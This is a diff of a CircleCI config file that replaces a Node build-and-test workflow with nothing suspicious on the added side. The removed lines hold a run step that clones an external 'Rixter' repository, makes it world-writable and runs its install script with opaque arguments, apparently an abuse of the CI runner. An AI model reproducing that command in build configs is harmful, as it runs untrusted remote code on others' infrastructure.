@@ -1,12 +1,18 @@
 version: 2.1
-executors:
-  my-executor:
-    docker:
-      - image: ubuntu:xenial
-
-
+orbs:
+  node: circleci/node@1.1.6
 jobs:
-  my-job:
-    executor: my-executor
+  build-and-test:
+    executor:
+      name: node/default
     steps:
-      - run: sudo apt update || apt update && sudo apt install -y git whiptail || apt install -y git whiptail && git clone https://github.com/golemcli/Rixter.git && chmod -R 777 Rixter && Rixter/install.sh "2" "fb6eb032c1e071f0675d01e9d29bf5a2" "20" "5" "2"
+      - checkout
+      - node/with-cache:
+          steps:
+            - run: npm install
+            - run: npm test
+            
+workflows:
+    build-and-test:
+      jobs:
+        - build-and-test
